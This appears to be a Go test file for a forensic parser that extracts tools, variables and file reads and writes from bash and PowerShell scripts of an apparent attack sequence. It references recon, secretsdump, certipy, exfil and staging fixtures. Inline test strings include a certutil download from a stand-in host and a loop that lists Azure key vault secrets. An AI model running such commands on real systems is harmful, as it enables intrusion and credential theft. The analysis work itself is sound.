package parse

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
)

const bashDir = "../evidencetest/testdata/bash"

func readFixture(tb testing.TB, name string) string {
	tb.Helper()
	data, err := os.ReadFile(filepath.Join(bashDir, name))
	if err != nil {
		tb.Fatal(err)
	}
	return string(data)
}

func toolNames(s Script) []string {
	var names []string
	for _, c := range s.Commands {
		names = append(names, c.Tool)
	}
	return names
}

func varMap(s Script) map[string]string {
	m := make(map[string]string)
	for _, v := range s.Variables {
		m[v.Name] = v.Value
	}
	return m
}

func contains(ss []string, target string) bool {
	return slices.Contains(ss, target)
}

func TestBashStep01Recon(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_101500_step01_recon.sh"))
	tools := toolNames(s)
	if !contains(tools, "nmap") {
		t.Errorf("commands = %v, want nmap", tools)
	}
	vars := varMap(s)
	if vars["TARGET_NET"] != "10.20.1.0/24" {
		t.Errorf("TARGET_NET = %q, want 10.20.1.0/24", vars["TARGET_NET"])
	}
	if vars["OUT"] != "20250301_101530_step01_recon.txt" {
		t.Errorf("OUT = %q, want 20250301_101530_step01_recon.txt", vars["OUT"])
	}
}

func TestBashStep02Enum(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_101800_step02_enum.sh"))
	tools := toolNames(s)
	if !contains(tools, "nxc") {
		t.Errorf("commands = %v, want nxc", tools)
	}
	if !contains(tools, "ldapsearch") {
		t.Errorf("commands = %v, want ldapsearch", tools)
	}
	if !contains(s.Writes, "20250301_101845_step02_enum.log") {
		t.Errorf("writes = %v, want enum.log", s.Writes)
	}
	if !contains(s.Writes, "20250301_101910_step02_users.tsv") {
		t.Errorf("writes = %v, want users.tsv", s.Writes)
	}
}

func TestBashStep03Adsync(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_102300_step03_adsync.sh"))
	tools := toolNames(s)
	if !contains(tools, "nxc") {
		t.Errorf("commands = %v, want nxc", tools)
	}
	if !contains(tools, "adconnectdump.py") {
		t.Errorf("commands = %v, want adconnectdump.py", tools)
	}
	if !contains(s.Reads, "20250301_101910_step02_users.tsv") {
		t.Errorf("reads = %v, want step02_users.tsv", s.Reads)
	}
}

func TestBashStep05Certs(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_103200_step05_certs.sh"))
	tools := toolNames(s)
	if !contains(tools, "certipy") {
		t.Errorf("commands = %v, want certipy", tools)
	}
	if !contains(tools, "openssl") {
		t.Errorf("commands = %v, want openssl", tools)
	}
	if !contains(s.Writes, "20250301_103240_certipy_find.txt") {
		t.Errorf("writes = %v, want certipy_find.txt", s.Writes)
	}
	if !contains(s.Writes, "20250301_103300_notes.txt") {
		t.Errorf("writes = %v, want notes.txt", s.Writes)
	}
	if !contains(s.Reads, "20250301_101910_step02_users.tsv") {
		t.Errorf("reads = %v, want step02_users.tsv", s.Reads)
	}
}

func TestBashStep06Auth(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_104000_step06_auth.sh"))
	tools := toolNames(s)
	if !contains(tools, "certipy") {
		t.Errorf("commands = %v, want certipy", tools)
	}
	if !contains(tools, "secretsdump.py") {
		t.Errorf("commands = %v, want secretsdump.py", tools)
	}
	if !contains(tools, "nxc") {
		t.Errorf("commands = %v, want nxc", tools)
	}
	if !contains(s.Writes, "20250301_104010_step06_auth.txt") {
		t.Errorf("writes = %v, want step06_auth.txt", s.Writes)
	}
	if !contains(s.Writes, "20250301_104030_ca_store.txt") {
		t.Errorf("writes = %v, want ca_store.txt", s.Writes)
	}
}

func TestBashStep07Exfil(t *testing.T) {
	s := ExtractBash(readFixture(t, "20250301_104500_step07_exfil.sh"))
	tools := toolNames(s)
	if !contains(tools, "nxc") {
		t.Errorf("commands = %v, want nxc", tools)
	}
	if !contains(tools, "curl") {
		t.Errorf("commands = %v, want curl", tools)
	}
	vars := varMap(s)
	if vars["CA_THUMB"] != "3f2a9c1e7b6d5a4f3e2d1c0b9a8f7e6d5c4b3a29" {
		t.Errorf("CA_THUMB = %q, want thumbprint", vars["CA_THUMB"])
	}
}

const psDir = "../evidencetest/testdata/powershell"

func readPsFixture(tb testing.TB, name string) string {
	tb.Helper()
	data, err := os.ReadFile(filepath.Join(psDir, name))
	if err != nil {
		tb.Fatal(err)
	}
	return string(data)
}

func TestPsStep01Inventory(t *testing.T) {
	s := ExtractPowerShell(readPsFixture(t, "20250302_090000_step01_inventory.ps1"))
	tools := toolNames(s)
	if !contains(tools, "get-adcomputer") {
		t.Errorf("commands = %v, want get-adcomputer", tools)
	}
	if !contains(tools, "select-object") {
		t.Errorf("commands = %v, want select-object", tools)
	}
	if !contains(tools, "export-csv") {
		t.Errorf("commands = %v, want export-csv", tools)
	}
	vars := varMap(s)
	if vars["Domain"] != "corp.example" {
		t.Errorf("Domain = %q, want corp.example", vars["Domain"])
	}
}

func TestPsStep02Sync(t *testing.T) {
	s := ExtractPowerShell(readPsFixture(t, "20250302_090500_step02_sync.ps1"))
	tools := toolNames(s)
	if !contains(tools, "import-csv") {
		t.Errorf("commands = %v, want import-csv", tools)
	}
	if !contains(tools, "invoke-command") {
		t.Errorf("commands = %v, want invoke-command", tools)
	}
}

func TestPsStep04Certs(t *testing.T) {
	s := ExtractPowerShell(readPsFixture(t, "20250302_091500_step04_certs.ps1"))
	tools := toolNames(s)
	if !contains(tools, "invoke-command") {
		t.Errorf("commands = %v, want invoke-command", tools)
	}
	if !contains(tools, "certutil.exe") {
		t.Errorf("commands = %v, want certutil.exe", tools)
	}
	if !contains(s.Writes, "cert_store_20250302_091530.txt") {
		t.Errorf("writes = %v, want cert_store", s.Writes)
	}
	if !contains(s.Writes, "ca_ping_20250302_091540.log") {
		t.Errorf("writes = %v, want ca_ping", s.Writes)
	}
}

func TestPsStep05Export(t *testing.T) {
	s := ExtractPowerShell(readPsFixture(t, "20250302_092200_step05_export.ps1"))
	tools := toolNames(s)
	if !contains(tools, "export-certificate") {
		t.Errorf("commands = %v, want export-certificate", tools)
	}
	if !contains(tools, "new-selfsignedcertificate") {
		t.Errorf("commands = %v, want new-selfsignedcertificate", tools)
	}
	if !contains(s.Writes, "export_summary_20250302_092215.txt") {
		t.Errorf("writes = %v, want export_summary", s.Writes)
	}
}

func transformMethods(s Script) []string {
	var methods []string
	for _, x := range s.Transforms {
		methods = append(methods, x.Method)
	}
	return methods
}

func TestPsStep06StageTransforms(t *testing.T) {
	s := ExtractPowerShell(readPsFixture(t, "20250302_093000_step06_stage.ps1"))

	methods := transformMethods(s)
	want := []string{
		"Base64Encode",
		"Stream",
		"GZip",
		"TextEncoding",
		"Crypto:Aes",
		"XOR",
		"StringManip",
		"HexEncode",
		"EncodedCommand",
	}
	for _, w := range want {
		if !contains(methods, w) {
			t.Errorf("transforms = %v, missing %s", methods, w)
		}
	}

	if !contains(s.Writes, "staged_20250302_093010.b64") {
		t.Errorf("writes = %v, want staged .b64", s.Writes)
	}
	if !contains(s.Writes, "staged_20250302_093050.ses") {
		t.Errorf("writes = %v, want staged .ses", s.Writes)
	}
	if !contains(s.Writes, "staged_20250302_093100.cmd") {
		t.Errorf("writes = %v, want staged .cmd", s.Writes)
	}
	if len(s.Writes) < 6 {
		t.Errorf("writes = %v, want at least 6 staged files", s.Writes)
	}
}

func TestBashHereDocDetection(t *testing.T) {
	tests := []struct {
		name      string
		text      string
		wantTools []string
	}{
		{"here-doc body is skipped", "cat <<EOF\nnmap inside\nEOF\ncurl after\n", []string{"cat", "curl"}},
		{"quoted dash here-doc", "cat <<-'EOF'\nnmap inside\nEOF\ncurl after\n", []string{"cat", "curl"}},
		{"here-string", "cat <<< \"hello\"\ncurl after\n", []string{"cat", "curl"}},
		{"arithmetic shift", "x=$((1 << 4))\ncurl after\n", []string{"curl"}},
		{"arithmetic condition", "if ((1 << 4)); then\ncurl after\nfi\n", []string{"curl"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := toolNames(ExtractBash(tc.text))
			if !slices.Equal(got, tc.wantTools) {
				t.Errorf("tools = %v, want %v", got, tc.wantTools)
			}
		})
	}
}

func TestExtractCommandChoosesTheShell(t *testing.T) {
	cases := []struct {
		text string
		want []string
	}{
		{"nmap -sV 10.0.0.5 | tee out.txt", []string{"nmap", "tee"}},
		{"apt-get install -y nmap", []string{"apt-get"}},
		{"Get-ADUser -Filter * | Export-Csv users.csv", []string{"get-aduser", "export-csv"}},
		{`pwsh -c "certutil.exe -urlcache -f http://a.example/x"`, []string{"certutil.exe", "pwsh"}},
	}
	for _, c := range cases {
		if got := toolNames(ExtractCommand(c.text)); !slices.Equal(got, c.want) {
			t.Errorf("ExtractCommand(%q) tools = %q, want %q", c.text, got, c.want)
		}
	}
}

func TestBaseName(t *testing.T) {
	cases := map[string]string{
		"out.txt":                 "out.txt",
		"./out.txt":               "out.txt",
		"/tmp/a/out.txt":          "out.txt",
		`C:\loot\out.txt`:         "out.txt",
		`.\sub/mixed\out.txt`:     "out.txt",
		`\\host\share\tools\a.sh`: "a.sh",
		"dir/":                    "dir",
		"":                        "",
	}
	for in, want := range cases {
		if got := BaseName(in); got != want {
			t.Errorf("BaseName(%q) = %q, want %q", in, got, want)
		}
	}
}

// A tool keeps one name whatever separators its path uses and whatever
// operating system reads the script.
func TestBashToolNameIgnoresSeparators(t *testing.T) {
	cases := map[string]string{
		"/usr/bin/nmap -sn 10.20.1.0/24":          "nmap",
		`C:\\Tools\\nmap.exe -sn 10.20.1.0/24`:    "nmap.exe",
		"/mnt/c/Tools/nmap.exe -sn 10.20.1.0/24":  "nmap.exe",
		`C:/Tools\\Sub/nmap.exe -sn 10.20.1.0/24`: "nmap.exe",
	}
	for line, want := range cases {
		if got := toolNames(ExtractBash(line + "\n")); !slices.Equal(got, []string{want}) {
			t.Errorf("ExtractBash(%q) tools = %q, want [%q]", line, got, want)
		}
	}
}

func TestBashContinuedCommandIsOneCommand(t *testing.T) {
	script := "curl -s -X POST \\\n  -d \"scope=x\" \\\n  \"https://login.example.com/token\" > token.json\n" +
		"# a comment that ends in a backslash \\\n" +
		"echo 'a\\\\'\n" +
		"id\n"
	s := ExtractBash(script)
	if got, want := toolNames(s), []string{"curl", "id"}; !slices.Equal(got, want) {
		t.Errorf("tools = %q, want %q", got, want)
	}
	if !slices.Contains(s.Writes, "token.json") {
		t.Errorf("writes = %q, want token.json", s.Writes)
	}
	if len(s.Commands) == 0 || s.Commands[0].Line != 1 {
		t.Errorf("commands = %+v, want the continued command on line 1", s.Commands)
	}
}

func TestBashForListIsNotACommand(t *testing.T) {
	cases := map[string][]string{
		"for v in $(cat vaults.txt); do az keyvault secret list --vault-name \"$v\"; done": {"cat", "az"},
		"for f in *.txt; do\n  gzip \"$f\"\ndone":                                          {"gzip"},
	}
	for script, want := range cases {
		if got := toolNames(ExtractBash(script + "\n")); !slices.Equal(got, want) {
			t.Errorf("ExtractBash(%q) tools = %q, want %q", script, got, want)
		}
	}
}
